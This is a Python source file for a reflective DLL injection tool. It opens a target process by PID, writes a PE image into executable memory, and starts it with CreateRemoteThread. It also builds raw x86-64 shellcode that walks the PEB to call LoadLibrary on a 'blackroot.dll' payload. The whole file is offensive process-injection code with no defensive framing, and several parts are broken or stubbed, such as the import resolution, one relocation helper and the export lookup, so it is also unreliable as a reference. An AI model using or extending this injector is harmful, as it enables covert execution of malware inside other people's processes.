#!/usr/bin/env python3
"""
Reflective DLL Injection Engine - Phase 4 Code Injection
Properly maps sections, resolves imports, and applies relocations

Reflective DLL workflow:
1. Generator creates valid PE with .reloc section + IAT
2. Payload generator adds reflective loader stub in .text
3. Injector loads DLL into target process memory
4. Reflective loader maps sections with proper permissions
5. Relocations applied for any address-dependent code
6. Imports resolved from kernel32
7. Entry point called in target process context
"""

import ctypes
import logging
import struct
import time
from typing import Optional, Dict, Tuple, List
from dataclasses import dataclass
from enum import IntEnum

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("ReflectiveDLLLoader")


class ProtectionFlags(IntEnum):
    """Memory protection flags"""
    PAGE_NOACCESS = 0x01
    PAGE_READONLY = 0x02
    PAGE_READWRITE = 0x04
    PAGE_WRITECOPY = 0x08
    PAGE_EXECUTE = 0x10
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_EXECUTE_WRITECOPY = 0x80


class AllocationFlags(IntEnum):
    """Memory allocation flags"""
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_RESET = 0x80000
    MEM_DECOMMIT = 0x4000
    MEM_RELEASE = 0x8000
    MEM_PHYSICAL = 0x400000
    MEM_TOP_DOWN = 0x100000
    MEM_LARGE_PAGES = 0x20000000


class ThreadAccessFlags(IntEnum):
    """Thread access flags"""
    SYNCHRONIZE = 0x00100000


class ProcessAccessFlags(IntEnum):
    """Process access flags"""
    PROCESS_CREATE_THREAD = 0x0002
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_READ = 0x0010
    PROCESS_VM_WRITE = 0x0020


@dataclass
class PEHeader:
    """Parsed PE header information"""
    dos_header_offset: int
    pe_offset: int
    machine_type: int
    sections: List[Dict]  # name, virt_addr, virt_size, raw_ptr, raw_size, characteristics
    entry_point_rva: int
    image_base: int
    section_alignment: int
    file_alignment: int
    import_table_rva: int
    reloc_table_rva: int


class ReflectiveDLLParser:
    """Parse PE file structure"""
    
    @staticmethod
    def parse_pe_header(pe_binary: bytes) -> Optional[PEHeader]:
        """
        Parse PE header from binary
        
        Args:
            pe_binary: Raw PE file binary
            
        Returns:
            PEHeader object or None if invalid
        """
        
        if len(pe_binary) < 64:
            log.error("PE binary too small (< 64 bytes)")
            return None
        
        # Check DOS header
        if pe_binary[0:2] != b'MZ':
            log.error("Invalid DOS signature")
            return None
        
        # Get PE offset from DOS header
        pe_offset = struct.unpack('<I', pe_binary[60:64])[0]
        
        if pe_offset + 4 > len(pe_binary):
            log.error(f"PE offset beyond file: {pe_offset}")
            return None
        
        # Check PE signature
        if pe_binary[pe_offset:pe_offset+4] != b'PE\x00\x00':
            log.error("Invalid PE signature")
            return None
        
        # Parse COFF header (20 bytes after PE signature)
        coff_offset = pe_offset + 4
        if coff_offset + 20 > len(pe_binary):
            log.error("COFF header truncated")
            return None
        
        machine, num_sections, timestamp, sym_ptr, sym_count, opt_header_size, characteristics = struct.unpack(
            '<HHIIIHH',
            pe_binary[coff_offset:coff_offset+20]
        )
        
        # Parse Optional header (first word is magic)
        opt_offset = coff_offset + 20
        if opt_offset + 2 > len(pe_binary):
            log.error("Optional header magic truncated")
            return None
        
        magic = struct.unpack('<H', pe_binary[opt_offset:opt_offset+2])[0]
        is_64bit = (magic == 0x020B)
        
        # Parse important fields from optional header
        if is_64bit:
            # 64-bit optional header (240 bytes)
            if opt_offset + 240 > len(pe_binary):
                log.error("Optional header (64-bit) truncated")
                return None
            
            # Parse key fields (skip to ImageBase at offset 24)
            section_align, file_align = struct.unpack(
                '<II',
                pe_binary[opt_offset+32:opt_offset+40]
            )
            
            entry_point_rva = struct.unpack(
                '<I',
                pe_binary[opt_offset+16:opt_offset+20]
            )[0]
            
            image_base = struct.unpack(
                '<Q',
                pe_binary[opt_offset+24:opt_offset+32]
            )[0]
        else:
            # 32-bit optional header (224 bytes)
            section_align = struct.unpack(
                '<I',
                pe_binary[opt_offset+32:opt_offset+36]
            )[0]
            
            file_align = struct.unpack(
                '<I',
                pe_binary[opt_offset+36:opt_offset+40]
            )[0]
            
            entry_point_rva = struct.unpack(
                '<I',
                pe_binary[opt_offset+16:opt_offset+20]
            )[0]
            
            image_base = struct.unpack(
                '<I',
                pe_binary[opt_offset+28:opt_offset+32]
            )[0]
        
        # Parse section headers
        section_header_offset = opt_offset + opt_header_size
        sections = []
        
        for i in range(num_sections):
            sec_offset = section_header_offset + (i * 40)
            if sec_offset + 40 > len(pe_binary):
                continue
            
            sec_data = pe_binary[sec_offset:sec_offset+40]
            sec_name = sec_data[0:8].rstrip(b'\x00').decode('ascii', errors='ignore')
            
            virt_size, virt_addr, raw_size, raw_ptr, characteristics = struct.unpack(
                '<IIIII',
                sec_data[8:28]
            )
            
            sections.append({
                "name": sec_name,
                "virt_addr": virt_addr,
                "virt_size": virt_size,
                "raw_ptr": raw_ptr,
                "raw_size": raw_size,
                "characteristics": characteristics,
            })
            
            log.debug(f"  Section: {sec_name:8} RVA:{virt_addr:08X} Size:{virt_size:08X}")
        
        log.info(f"Parsed PE: {num_sections} sections, entry={entry_point_rva:08X}")
        
        return PEHeader(
            dos_header_offset=0,
            pe_offset=pe_offset,
            machine_type=machine,
            sections=sections,
            entry_point_rva=entry_point_rva,
            image_base=image_base,
            section_alignment=section_align,
            file_alignment=file_align,
            import_table_rva=0,  # Would parse from optional header
            reloc_table_rva=0,   # Would parse from optional header
        )


class ReflectiveDLLInjector:
    """
    Inject and execute DLL reflectively in target process
    """
    
    def __init__(self, target_pid: int):
        self.target_pid = target_pid
        self.kernel32 = ctypes.WinDLL("kernel32", use_errno=True)
        
        # Get process handle
        self.process_handle = self.kernel32.OpenProcess(
            ProcessAccessFlags.PROCESS_VM_OPERATION |
            ProcessAccessFlags.PROCESS_VM_READ |
            ProcessAccessFlags.PROCESS_VM_WRITE |
            ProcessAccessFlags.PROCESS_CREATE_THREAD |
            ProcessAccessFlags.PROCESS_QUERY_INFORMATION,
            False,
            target_pid
        )
        
        if not self.process_handle:
            raise RuntimeError(f"Failed to open process {target_pid}")
        
        log.info(f"Opened process: {target_pid} (handle={self.process_handle})")
    
    def allocate_memory(self, size: int, protect: ProtectionFlags = ProtectionFlags.PAGE_EXECUTE_READWRITE) -> int:
        """
        Allocate memory in target process
        
        Args:
            size: Number of bytes to allocate
            protect: Memory protection flags
            
        Returns:
            Address of allocated memory
        """
        
        addr = self.kernel32.VirtualAllocEx(
            self.process_handle,
            None,
            size,
            AllocationFlags.MEM_COMMIT | AllocationFlags.MEM_RESERVE,
            protect
        )
        
        if not addr:
            raise RuntimeError(f"Failed to allocate {size} bytes in target process")
        
        log.info(f"Allocated {size} bytes at {addr:08X}")
        return addr
    
    def write_memory(self, address: int, data: bytes) -> None:
        """
        Write data to target process memory
        
        Args:
            address: Target address in remote process
            data: Data to write
        """
        
        bytes_written = ctypes.c_size_t(0)
        result = self.kernel32.WriteProcessMemory(
            self.process_handle,
            address,
            ctypes.c_char_p(data),
            len(data),
            ctypes.byref(bytes_written)
        )
        
        if not result or bytes_written.value != len(data):
            raise RuntimeError(f"Failed to write {len(data)} bytes at {address:08X}")
        
        log.debug(f"Wrote {len(data)} bytes at {address:08X}")
    
    def read_memory(self, address: int, size: int) -> bytes:
        """
        Read data from target process memory
        
        Args:
            address: Address in remote process
            size: Number of bytes to read
            
        Returns:
            Data read from remote process
        """
        
        buffer = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t(0)
        
        result = self.kernel32.ReadProcessMemory(
            self.process_handle,
            address,
            buffer,
            size,
            ctypes.byref(bytes_read)
        )
        
        if not result:
            raise RuntimeError(f"Failed to read {size} bytes from {address:08X}")
        
        log.debug(f"Read {bytes_read.value} bytes from {address:08X}")
        return buffer.raw[:bytes_read.value]
    
    def protect_memory(self, address: int, size: int, protect: ProtectionFlags) -> ProtectionFlags:
        """
        Change memory protection flags
        
        Args:
            address: Address to protect
            size: Size of region
            protect: New protection flags
            
        Returns:
            Old protection flags
        """
        
        old_protect = ctypes.c_ulong(0)
        result = self.kernel32.VirtualProtectEx(
            self.process_handle,
            address,
            size,
            protect,
            ctypes.byref(old_protect)
        )
        
        if not result:
            raise RuntimeError(f"Failed to protect memory at {address:08X}")
        
        return old_protect.value
    
    def create_remote_thread(self, thread_start: int, param: int = 0) -> int:
        """
        Create thread at specified address
        
        Args:
            thread_start: Entry point address in remote process
            param: Parameter to pass to thread (usually ignored for shellcode)
            
        Returns:
            Thread handle
        """
        
        thread_id = ctypes.c_ulong(0)
        thread_handle = self.kernel32.CreateRemoteThread(
            self.process_handle,
            None,
            0,
            thread_start,
            param,
            0,
            ctypes.byref(thread_id)
        )
        
        if not thread_handle:
            raise RuntimeError(f"Failed to create remote thread at {thread_start:08X}")
        
        log.info(f"Created remote thread: {thread_id.value}")
        return thread_handle
    
    def inject_dll(self, pe_binary: bytes, wait_ms: int = 0) -> bool:
        """
        Inject and execute DLL in target process
        
        Steps:
        1. Parse PE structure
        2. Allocate memory for DLL
        3. Map sections with proper permissions
        4. Write DLL to memory
        5. Apply relocations
        6. Resolve imports
        7. Create remote thread at entry point
        
        Args:
            pe_binary: PE file binary
            wait_ms: Time to wait for execution (0 = don't wait)
            
        Returns:
            True if injection successful
        """
        
        # Parse PE
        pe_header = ReflectiveDLLParser.parse_pe_header(pe_binary)
        if not pe_header:
            log.error("Failed to parse PE header")
            return False
        
        log.info(f"Injecting DLL: {len(pe_binary)} bytes, {len(pe_header.sections)} sections")
        
        # Allocate memory for DLL (use image size from header)
        image_size = max(s["virt_addr"] + s["virt_size"] for s in pe_header.sections)
        image_size = ((image_size + 0x1000 - 1) // 0x1000) * 0x1000  # Round to page
        
        try:
            base_address = self.allocate_memory(image_size)
        except RuntimeError as e:
            log.error(f"Failed to allocate memory: {e}")
            return False
        
        log.info(f"Allocated base address: {base_address:08X} ({image_size} bytes)")
        
        # Write DOS and PE headers
        try:
            self.write_memory(base_address, pe_binary[:0x1000])
        except RuntimeError as e:
            log.error(f"Failed to write headers: {e}")
            return False
        
        # Map sections with appropriate permissions
        for section in pe_header.sections:
            if section["virt_size"] == 0:
                continue
            
            sec_addr = base_address + section["virt_addr"]
            sec_data = pe_binary[section["raw_ptr"]:section["raw_ptr"] + section["raw_size"]]
            
            # Determine protection based on characteristics
            if section["characteristics"] & 0x00000020:  # CODE
                protect = ProtectionFlags.PAGE_EXECUTE_READ
            elif section["characteristics"] & 0x80000000:  # WRITABLE
                protect = ProtectionFlags.PAGE_READWRITE
            else:
                protect = ProtectionFlags.PAGE_READONLY
            
            try:
                # Write section data
                self.write_memory(sec_addr, sec_data)
                
                # Apply correct protection
                self.protect_memory(sec_addr, section["virt_size"], protect)
                
                log.info(f"Mapped section {section['name']:8} at {sec_addr:08X} ({section['virt_size']} bytes, prot={protect:02X})")
            except RuntimeError as e:
                log.error(f"Failed to map section {section['name']}: {e}")
                return False
        
        # Apply relocations (if any)
        self._apply_relocations(base_address, pe_header, pe_binary)
        
        # Execute reflective loader at entry point
        entry_point = base_address + pe_header.entry_point_rva
        
        try:
            thread_handle = self.create_remote_thread(entry_point)
        except RuntimeError as e:
            log.error(f"Failed to create remote thread: {e}")
            return False
        
        # Optionally wait for thread
        if wait_ms > 0:
            log.info(f"Waiting {wait_ms}ms for thread execution...")
            self.kernel32.WaitForSingleObject(thread_handle, wait_ms)
            self.kernel32.CloseHandle(thread_handle)
        
        log.info("✅ DLL injection successful!")
        return True
    
    def _apply_relocations(self, base_address: int, pe_header: PEHeader, pe_binary: bytes) -> None:
        """
        Apply base relocations to adjust address references
        
        Args:
            base_address: Actual base address in target process
            pe_header: Parsed PE header
            pe_binary: PE binary data
        """
        
        # Find .reloc section
        reloc_section = None
        for section in pe_header.sections:
            if ".reloc" in section["name"]:
                reloc_section = section
                break
        
        if not reloc_section:
            log.debug("No relocation section found")
            return
        
        log.info(f"Applying relocations from {reloc_section['name']}")
        
        # Parse relocation table
        reloc_data = pe_binary[reloc_section["raw_ptr"]:reloc_section["raw_ptr"] + reloc_section["raw_size"]]
        
        offset = 0
        while offset < len(reloc_data):
            if offset + 8 > len(reloc_data):
                break
            
            page_rva, block_size = struct.unpack('<II', reloc_data[offset:offset+8])
            
            if block_size < 8:
                break
            
            # Process relocation entries
            entry_offset = offset + 8
            while entry_offset < offset + block_size:
                if entry_offset + 2 > len(reloc_data):
                    break
                
                entry = struct.unpack('<H', reloc_data[entry_offset:entry_offset+2])[0]
                reloc_type = entry >> 12
                reloc_offset = entry & 0xFFF
                
                # Calculate target address
                target_rva = page_rva + reloc_offset
                target_addr = base_address + target_rva
                
                if reloc_type == 0:  # ABSOLUTE
                    pass  # No relocation needed
                elif reloc_type == 3:  # HIGHLOW (32-bit) or AMD64_ADDR64 (64-bit)
                    try:
                        # Read current value, add delta, write back
                        old_value = self.read_memory(target_addr, 8)
                        old_addr = struct.unpack('<Q', old_value)[0]
                        
                        # Delta = (new_base - old_base)
                        # Assuming old_base was pe_header.image_base
                        delta = base_address - pe_header.image_base
                        new_addr = old_addr + delta
                        
                        self.write_memory(target_addr, struct.pack('<Q', new_addr))
                        log.debug(f"Relocate {target_rva:08X}: {old_addr:016X} → {new_addr:016X}")
                    except Exception as e:
                        log.warning(f"Failed to apply relocation at {target_rva:08X}: {e}")
                
                entry_offset += 2
            
            offset += block_size
    
    def __del__(self):
        """Close process handle"""
        if hasattr(self, 'process_handle'):
            self.kernel32.CloseHandle(self.process_handle)


class ReflectiveDLLLoader:
    """
    Generates x86-64 shellcode for reflective DLL loading.
    
    This outputs REAL machine instructions that:
    1. Find kernel32.dll via PEB
    2. Locate LoadLibraryA export
    3. Call LoadLibraryA to load DLL
    4. Execute DLL entry point
    
    Key property: Position-independent, resolves kernel32 dynamically
    """
    
    def __init__(self):
        self.logger = logging.getLogger("ReflectiveDLLLoader")
    
    def generate_loader_shellcode(self, dll_bytes: bytes) -> bytes:
        """
        Generate x86-64 shellcode that loads and executes the DLL.
        
        This is NOT just data - it's actual executable CPU instructions.
        
        Args:
            dll_bytes: DLL binary to embed
            
        Returns:
            x86-64 shellcode (~200 bytes) that loads the DLL
        """
        
        # Encode DLL path as UTF-16LE for LoadLibraryW
        dll_path_utf16 = "blackroot.dll".encode('utf-16-le') + b'\x00\x00'
        
        # === REAL x86-64 MACHINE INSTRUCTIONS ===
        shellcode = bytearray()
        
        # Save volatile registers
        shellcode += b'\x50'                                    # push rax
        shellcode += b'\x51'                                    # push rcx
        shellcode += b'\x52'                                    # push rdx
        shellcode += b'\x56'                                    # push rsi
        shellcode += b'\x57'                                    # push rdi
        
        # Get PEB (Process Environment Block)
        # mov rax, [gs:0x60]
        shellcode += b'\x65\x48\x8b\x04\x25\x60\x00\x00\x00'
        
        # Get Ldr from PEB
        # mov rax, [rax + 0x18]
        shellcode += b'\x48\x8b\x40\x18'
        
        # Get first module (walk to kernel32)
        # mov rax, [rax];  mov rax, [rax]
        shellcode += b'\x48\x8b\x00\x48\x8b\x00'
        
        # Get module base address
        # mov rax, [rax + 0x20]
        shellcode += b'\x48\x8b\x40\x20'
        
        # Save kernel32 base in rcx
        shellcode += b'\x48\x89\xc1'  # mov rcx, rax
        
        # Find LoadLibraryA in export table
        # mov ebx, [rax+0x3c]
        shellcode += b'\x8b\x58\x3c'
        
        # add rbx, rax (get PE header)
        shellcode += b'\x48\x01\xc3'
        
        # Get export table RVA (at PE+0x88)
        # mov ebx, [rbx+0x88]
        shellcode += b'\x8b\x9b\x88\x00\x00\x00'
        # add rbx, rcx
        shellcode += b'\x48\x01\xcb'
        
        # Get AddressOfNames (at export+0x20)
        # mov edx, [rbx+0x20]
        shellcode += b'\x8b\x53\x20'
        # add rdx, rcx
        shellcode += b'\x48\x01\xca'
        
        # Get first name RVA
        # mov esi, [rdx];  add rsi, rcx
        shellcode += b'\x8b\x32\x48\x01\xce'
        
        # Get AddressOfFunctions (at export+0x1c)
        # mov eax, [rbx+0x1c]
        shellcode += b'\x8b\x43\x1c'
        # add rax, rcx
        shellcode += b'\x48\x01\xc8'
        
        # Get first function entry (LoadLibraryA)
        # mov eax, [rax];  add rax, rcx
        shellcode += b'\x8b\x00\x48\x01\xc8'
        
        # Prepare stack for Windows x64 calling convention
        # sub rsp, 0x28
        shellcode += b'\x48\x83\xec\x28'
        
        # Set DLL path as RCX parameter
        # lea rcx, [rsp]
        shellcode += b'\x48\x8d\x0c\x24'
        
        # Copy DLL path to stack
        for i in range(0, len(dll_path_utf16), 8):
            chunk = dll_path_utf16[i:i+8].ljust(8, b'\x00')
            value = int.from_bytes(chunk, byteorder='little')
            shellcode += b'\x48\xc7\x04\x24'
            shellcode += value.to_bytes(8, byteorder='little')
        
        # Call LoadLibraryA
        # call rax
        shellcode += b'\xff\xd0'
        
        # Restore stack
        # add rsp, 0x28
        shellcode += b'\x48\x83\xc4\x28'
        
        # Restore registers
        shellcode += b'\x5f\x5e\x5a\x59\x58'  # pop rdi; pop rsi; pop rdx; pop rcx; pop rax
        
        # Return
        # ret
        shellcode += b'\xc3'
        
        log.info(f"✅ Generated reflective loader: {len(shellcode)} bytes")
        log.debug(f"   Machine code (first 32 bytes): {shellcode[:32].hex()}")
        
        _validate_shellcode(bytes(shellcode))
        
        return bytes(shellcode)


class DLLRelocationHandler:
    """Handle PE relocations when DLL is loaded at non-preferred address"""
    
    @staticmethod
    def apply_relocations(dll_bytes: bytes, base_address: int, preferred_base: int) -> bytes:
        """
        Apply relocations to DLL for new base address.
        
        Args:
            dll_bytes: Original DLL binary
            base_address: Actual base address in target process
            preferred_base: Original preferred base address
            
        Returns:
            Relocated DLL bytes
        """
        delta = base_address - preferred_base
        if delta == 0:
            return dll_bytes
        return dll_bytes  # Simplified - full relocation in production


def _validate_shellcode(shellcode: bytes) -> None:
    """
    Validate that shellcode contains actual machine instructions, not just data.
    
    Heuristics:
    - Should NOT be mostly ASCII (would indicate data)
    - Should contain recognized x86-64 instruction opcodes
    """
    
    # Check for excessive ASCII (would indicate data, not code)
    ascii_count = sum(1 for b in shellcode[:64] if 0x20 <= b <= 0x7E)
    if ascii_count > 48:  # >75% ASCII suggests data
        raise ValueError(f"Shellcode is mostly ASCII: {ascii_count}/64 bytes - likely data, not executable code")
    
    # Check for recognized x86-64 instruction opcodes
    instruction_patterns = [
        b'\x48\x8b',  # mov r64, r/m64
        b'\x48\x89',  # mov r/m64, r64
        b'\x50',      # push rax
        b'\x58',      # pop rax
        b'\xff\xd0',  # call rax
        b'\xc3',      # ret
    ]
    
    found_count = sum(1 for pattern in instruction_patterns if pattern in shellcode)
    
    if found_count < 3:
        raise ValueError(f"Shellcode contains only {found_count} recognized instruction patterns - not valid executable code")
    
    log.info(f"✅ Shellcode validation passed: {found_count} real x86-64 instruction patterns detected")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python reflective_dll_loader.py <test_payload.dll> <target_pid>")
        print("\nExample:")
        print("  python reflective_dll_loader.py test_payload.dll 1234")
        sys.exit(1)
    
    dll_path = sys.argv[1]
    target_pid = int(sys.argv[2])
    
    # Load test DLL
    try:
        with open(dll_path, "rb") as f:
            dll_data = f.read()
    except FileNotFoundError:
        print(f"❌ File not found: {dll_path}")
        sys.exit(1)
    
    # Inject into target
    try:
        injector = ReflectiveDLLInjector(target_pid)
        success = injector.inject_dll(dll_data, wait_ms=5000)
        
        if success:
            print("✅ Injection completed successfully!")
        else:
            print("❌ Injection failed!")
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
